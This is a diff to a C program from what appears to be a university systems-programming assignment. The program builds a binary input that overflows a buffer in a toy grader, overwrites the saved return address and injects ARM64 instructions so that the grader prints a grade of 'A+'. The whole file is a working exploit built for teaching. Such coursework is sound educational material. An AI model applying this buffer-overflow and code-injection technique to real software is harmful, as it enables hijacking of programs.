@@ -1,6 +1,14 @@
+/*--------------------------------------------------------------------*/
+/* createdataAplus.c                                                  */
+/* Authors: Jacob Santelli and Joshua Yang                            */
+/*--------------------------------------------------------------------*/
+
 #include <stdio.h>
 #include "miniassembler.h"
 
+/* Main takes no input; writes output to dataAplus, a binary file that 
+   overruns the buffer of grader.c and gives "Josh" a grade of 'A+'.
+   Returns dataAplus. */
 int main(void) {
     /* file to write to */
     FILE *psFile;
@@ -30,27 +38,27 @@ int main(void) {
 
     /* adr x0, grade */
     uiCurrInstr = MiniAssembler_adr(0, 0x420044, 0x420060);
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* mov x1, '\0' */
     uiCurrInstr = MiniAssembler_mov(1, '\0');
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* strb x1, [x0] */
     uiCurrInstr = MiniAssembler_strb(1, 0);
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* adr x0, "A+" */
     uiCurrInstr = MiniAssembler_adr(0, 0x42005d, 0x42006c);
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* bl printf; aka calls printf("A+") */
     uiCurrInstr = MiniAssembler_bl(0x400600, 0x420070);
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* b 0x400864 (line 47 of grader.c) */
     uiCurrInstr = MiniAssembler_b(0x400864, 0x420074);
-    fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
+    (void) fwrite(&uiCurrInstr, sizeof(unsigned int), 1, psFile);
 
     /* filler to overflow buffer */
     for (i = 0; i < 16; i++) {
@@ -59,7 +67,7 @@ int main(void) {
 
     /* overwrite X30 with address to adr instruction above */
     ulAddress = 0x420060;
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    (void) fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
     
     fclose(psFile);
     return 0;
